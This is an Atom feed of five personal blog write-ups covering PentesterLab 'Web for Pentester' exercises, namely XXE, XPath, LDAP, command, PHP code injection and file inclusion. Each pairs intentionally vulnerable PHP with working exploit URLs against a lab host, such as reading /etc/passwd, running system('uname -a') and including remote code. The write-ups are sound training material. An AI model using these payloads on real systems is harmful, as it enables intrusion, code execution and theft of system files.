<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: web pentest | Bob1Bob2]]></title>
  <link href="http://wg135.github.io/blog/categories/web-pentest/atom.xml" rel="self"/>
  <link href="http://wg135.github.io/"/>
  <updated>2016-06-29T15:30:56-05:00</updated>
  <id>http://wg135.github.io/</id>
  <author>
    <name><![CDATA[Bob1Bob2]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Pentesterlab--Web for Pentester-XML]]></title>
    <link href="http://wg135.github.io/blog/2016/03/23/pentesterlab-web-for-pentester-xml/"/>
    <updated>2016-03-23T16:11:36-05:00</updated>
    <id>http://wg135.github.io/blog/2016/03/23/pentesterlab-web-for-pentester-xml</id>
    <content type="html"><![CDATA[<p>Web for Pentester: This exercise is a set of the most common web vulnerabilities</p>

<p>Difficluty: 1/5</p>

<!--more-->


<p>OWASP: <a href="https://www.owasp.org/index.php/Testing_for_XML_Injection_%28OTG-INPVAL-008%29">Testing for XML Injection</a></p>

<h3>Example 1</h3>

<p>code review</p>

<pre><code class="php example1.php">&lt;?php
  $xml=simplexml_load_string($_GET['xml']);
  print_r((string)$xml);
?&gt;
</code></pre>

<p>XML injection point search:</p>

<p>ZAP add fuzzing file:</p>

<p><code>https://wfuzz.googlecode.com/svn/trunk/wordlist/Injections/XML.txt</code></p>

<p>exploit:</p>

<p><code>http://192.168.79.162/xml/example1.php?xml=&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM "file:////etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></p>

<p><code>!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM "file:////etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code> needed to be encoded.</p>

<h3>Example 2</h3>

<p>code review</p>

<pre><code class="php example2.php"> $x = "&lt;data&gt;&lt;users&gt;&lt;user&gt;&lt;name&gt;hacker&lt;/name&gt;&lt;message&gt;Hello hacker&lt;/message&gt;&lt;password&gt;pentesterlab&lt;/password&gt;&lt;/user&gt;&lt;user&gt;&lt;name&gt;admin&lt;/name&gt;&lt;message&gt;Hello admin&lt;/message&gt;&lt;password&gt;s3cr3tP4ssw0rd&lt;/password&gt;&lt;/user&gt;&lt;/users&gt;&lt;/data&gt;";

  $xml=simplexml_load_string($x);
  $xpath = "users/user/name[.='".$_GET['name']."']/parent::*/message";
  $res = ($xml-&gt;xpath($xpath));
  while(list( ,$node) = each($res)) {
      echo $node;
  }
</code></pre>

<p>exploit:</p>

<p><code>http://192.168.79.162/xml/example2.php?name=' or 1=1]%00</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentesterlab--Web for Pentester-LDAP]]></title>
    <link href="http://wg135.github.io/blog/2016/03/22/pentesterlab-web-for-pentester-ldap/"/>
    <updated>2016-03-22T14:56:35-05:00</updated>
    <id>http://wg135.github.io/blog/2016/03/22/pentesterlab-web-for-pentester-ldap</id>
    <content type="html"><![CDATA[<p>Web for Pentester: This exercise is a set of the most common web vulnerabilities</p>

<p>Difficluty: 1/5</p>

<!--more-->


<p>What is LDAP injection?</p>

<p>from OWASP:</p>

<p><code>LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, itâ€™s possible to modify LDAP statements using a local proxy. This could result in the execution of arbitrary commands such as granting permissions to unauthorized queries, and content modification inside the LDAP tree. The same advanced exploitation techniques available in SQL Injection can be similarly applied in LDAP Injection.</code></p>

<p>more information:
<a href="https://www.owasp.org/index.php/LDAP_injection">LDAP injection</a></p>

<h3>Example 1</h3>

<p>from pentesterlab:</p>

<p><code>In this first example, you connect to a LDAP server, using your username and password. In this instance, The LDAP server does not authenticate you, since your credentials are invalid. However, some LDAP servers authorise NULL Bind: if null values are sent, the LDAP server will proceed to bind the connection, and the PHP code will think that the credentials are correct. To get the bind with 2 null values, you will need to completely remove this parameter from the query. If you keep something like username=&amp;password= in the URL, these values will not work, since they won't be null; instead, they will be empty.</code></p>

<p>code review:</p>

<pre><code class="php example1.php">  if ($ld) {
   if (isset($_GET["username"])) {
     $user = "uid=".$_GET["username"]."ou=people,dc=pentesterlab,dc=com";
   }
   $lb = @ldap_bind($ld, $user,$_GET["password"]);
</code></pre>

<p>The developer uses function <code>ldap_bind</code> to bind parameters. I can bypass the authentication by setting null values to the parameters.</p>

<p>exploit:</p>

<p><code>http://192.168.79.162/ldap/example1.php</code></p>

<h3>Example 2</h3>

<p>code review:</p>

<pre><code class="php example2.php">  $pass = "{MD5}".base64_encode(pack("H*",md5($_GET['password'])));
  $filter = "(&amp;(cn=".$_GET['name'].")(userPassword=".$pass."))";
</code></pre>

<p>Our goal here will be to inject inside <code>[INPUT1]</code> (the username parameter). We will need to inject:</p>

<ol>
<li>The end of the current filter using <code>hacker)</code>.</li>
<li>An always-true condition <code>((cn=*) for example)</code></li>
<li>A ) to keep a valid syntax and close the first <code>)</code></li>
<li><p>A NULL BYTE <code>(%00)</code> to get rid of the end of the filter</p>

<p>exploit:</p>

<p><code>http://192.168.79.162/ldap/example2.php?name=hacker)(cn=*))%00&amp;password=rtrtrtr</code></p>

<p>nmap search LDAP:</p>

<p><code>nmap -p 389 --script ldap-search 192.168.79.162</code></p></li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentestlab--Web for Pentester - Command Injection]]></title>
    <link href="http://wg135.github.io/blog/2016/03/21/pentestlab-web-for-pentester-command-injection/"/>
    <updated>2016-03-21T16:46:28-05:00</updated>
    <id>http://wg135.github.io/blog/2016/03/21/pentestlab-web-for-pentester-command-injection</id>
    <content type="html"><![CDATA[<p>Web for Pentester: This exercise is a set of the most common web vulnerability</p>

<p>Difficluty: 1/5</p>

<!--more-->


<p>From Pentestlab,</p>

<p><code>Command injection comes from a lack of filtering and encoding of information used as part of a command. The simplest example comes from using the function system (to run commands) and take an HTTP parameter as an argument of this command.</code></p>

<p><code>There are many ways to exploit a command injection:</code></p>

<pre><code>`By redirecting the result of the first command into the second | id`
`By running another command if the first one succeeds: &amp;&amp; id (where &amp; needs to be encoded)`
`By running another command if the first one fails (and making sure it does: error || id ` just here to 
</code></pre>

<h3>Example 1</h3>

<p>code review:</p>

<pre><code class="php example1.php">&lt;?php
  system("ping -c 2 ".$_GET['ip']);
?&gt;
</code></pre>

<p>The vulnerability is due to the developer doesn&rsquo;t perform any input validation, so I can use &amp;&amp; by add command after the normal input.</p>

<p>exploit:</p>

<p><code>http://192.168.79.162/commandexec/example1.php?ip=127.0.0.1%26%26ls</code></p>

<h3>Example 2</h3>

<p>code review:</p>

<pre><code class="php example2.php">&lt;?php
  if (!(preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}$/m', $_GET['ip']))) {
     die("Invalid IP address");
  }
  system("ping -c 2 ".$_GET['ip']);
?&gt;
</code></pre>

<p>The developer added input filter. However, it cannot prevent new line character, so I can inject command
<code>%0als</code></p>

<p>exploit:</p>

<p><code>http://192.168.79.162/commandexec/example2.php?ip=127.0.0.1%0als</code></p>

<h3>Example 3</h3>

<p>code review:</p>

<pre><code class="php example3.php">&lt;?php
  if (!(preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}$/', $_GET['ip']))) {
     header("Location: example3.php?ip=127.0.0.1");
  }
  system("ping -c 2 ".$_GET['ip']);
?&gt;
</code></pre>

<p>This example is really similar to the previous one; the only difference is that the developer does not stop the script correctly. In PHP, an easy and simple way to redirect users if one of the value provided doesn&rsquo;t match some security constraint is to call the function header. However, even if the browser will get redirected, this function does not stop the execution flow, and the script will still finish to run with the dangerous parameter. The developer needs to call the function die after the call to the function header, to avoid this issue.</p>

<p>exploit:</p>

<p>use <code>netcat</code></p>

<p><code>echo -e "GET /commandexec/example3.php?ip=127.0.0.1%26%26ls HTTP/1.1\r\nHost: 192.168.79.162\r\nConnection: close\r\n" | nc 192.168.79.162 80
</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentestlab--Web for Pentester - Code Injection]]></title>
    <link href="http://wg135.github.io/blog/2016/03/18/pentestlab-web-for-pentester-code-injection/"/>
    <updated>2016-03-18T14:37:22-05:00</updated>
    <id>http://wg135.github.io/blog/2016/03/18/pentestlab-web-for-pentester-code-injection</id>
    <content type="html"><![CDATA[<p>Web for Pentester: This exercise is a set of the most common web vulnerability</p>

<p>Difficluty: 1/5</p>

<!--more-->


<p>Pentester lab:
 Code executions come from a lack of filtering and/or escaping of user-controlled data. When you are exploiting a code injection, you will need to inject code within the information you are sending to the application. For example, if you want to run the command ls, you will need to send system(&ldquo;ls&rdquo;) to the application since it is a PHP application.</p>

<h3>Example 1</h3>

<p>code review:</p>

<pre><code class="php example1.php">?php 
  $str="echo \"Hello ".$_GET['name']."!!!\";";

  eval($str);
?&gt;
</code></pre>

<p> The developer use function <code>eval</code> to echo the name. Hpwever, the developer doesn&rsquo;t filter the input of eval function. By using concatenation <code>.</code>, I can add code after the input and use <code>#</code> to comment the rest of code</p>

<p> manually exploit:</p>

<p> <code>http://192.168.79.162/codeexec/example1.php?name=hacker".system('uname -a');#</code></p>

<p> payload <code>hacker".system('uname -a');#</code> needs to be URL encoded.</p>

<h3>Example 2</h3>

<p>code review:</p>

<pre><code class="php example2.php">$order = $_GET["order"];
    $result = mysql_query($sql);
  if ($result) {
        while ($row = mysql_fetch_assoc($result)) {
      $users[] = new User($row['id'],$row['name'],$row['age']);
    }
    if (isset($order)) { 
      usort($users, create_function('$a, $b', 'return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');'));
    }
    }   
</code></pre>

<p>Form Pentesterlab:</p>

<p>The function usort is often used with the function create_function to dynamically generate the &ldquo;sorting&rdquo; function, based on user-controlled information. If the web application lacks potent filtering and validation, this can lead to code execution.</p>

<p>manually exploit:</p>

<p><code>http://192.168.79.162/codeexec/example2.php?order=id);}system('uname -a');#</code></p>

<h3>Example 3</h3>

<p>code review:</p>

<pre><code class="php example3.php">&lt;?php
    echo preg_replace($_GET["pattern"], $_GET["new"], $_GET["base"]);
?&gt;
</code></pre>

<p>From Pentesterlab:</p>

<p>We talked earlier about regular expression modifiers with multi-line regular expression. Another very dangerous modifier exists in PHP: PCRE_REPLACE_EVAL (/e). This modifier will cause the function preg_replace to evaluate the new value as PHP code, before performing the substitution.</p>

<p>manually exploit:</p>

<p><code>http://192.168.79.162/codeexec/example3.php?new=system('uname%20-a')&amp;pattern=/lamer/e&amp;base=Hello lamer</code></p>

<h3>Example 4</h3>

<p>code review:</p>

<pre><code class="php example4.php">assert(trim("'".$_GET['name']."'"));
echo "Hello ".htmlentities($_GET['name']);
</code></pre>

<p>from Pentesterlab:</p>

<p>This example is based on the function assert. When used incorrectly, this function will evaluate the value received. This behaviour can be used to gain code execution.</p>

<p>manual exploit:</p>

<p><code>http://192.168.79.162/codeexec/example4.php?name=hacker'.system('uname -a').'</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentestlab-Web for Pentester - File Include]]></title>
    <link href="http://wg135.github.io/blog/2016/03/16/pentestlab-webforpentester-file-include/"/>
    <updated>2016-03-16T17:00:22-05:00</updated>
    <id>http://wg135.github.io/blog/2016/03/16/pentestlab-webforpentester-file-include</id>
    <content type="html"><![CDATA[<p>Web for Pentester: This exercise is a set of the most common web vulnerability</p>

<p>Difficluty: 1/5</p>

<!--more-->


<p>OWASP:
The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a &ldquo;dynamic file inclusion&rdquo; mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.</p>

<p>Tool: ZAP</p>

<h3>Example 1</h3>

<p>code review:</p>

<pre><code class="php example1.php">    if ($_GET["page"]) {
        include($_GET["page"]);

    } 
</code></pre>

<p>The developer uses <code>include</code> function in the code. However, there is no filter to protect file include attack. Use firebug to find the variable name is page, then do exploit:</p>

<p><code>http://192.168.79.162/fileincl/example1.php?page=../../../../../../etc/passwd</code></p>

<p>Also pentesterlab provide a online code <code>https://pentesterlab.com/test_include.txt</code></p>

<p><code>http://192.168.79.162/fileincl/example1.php?page=https://pentesterlab.com/test_include.txt</code></p>

<h3>Example 2</h3>

<p>code review:</p>

<pre><code class="php example2.php">    if ($_GET["page"]) {
    $file = $_GET["page"].".php";
    // simulate null byte issue
    $file = preg_replace('/\x00.*/',"",$file);
        include($file);

    } 
</code></pre>

<p>There is a null issue. he null byte character effectively tells the filesystem to ignore anything that comes after it. When the path is resolved by the filesystem</p>

<p>so I can do:</p>

<p><code>http://192.168.79.162/fileincl/example2.php?page=https://pentesterlab.com/test_include.txt%00</code></p>
]]></content>
  </entry>
  
</feed>
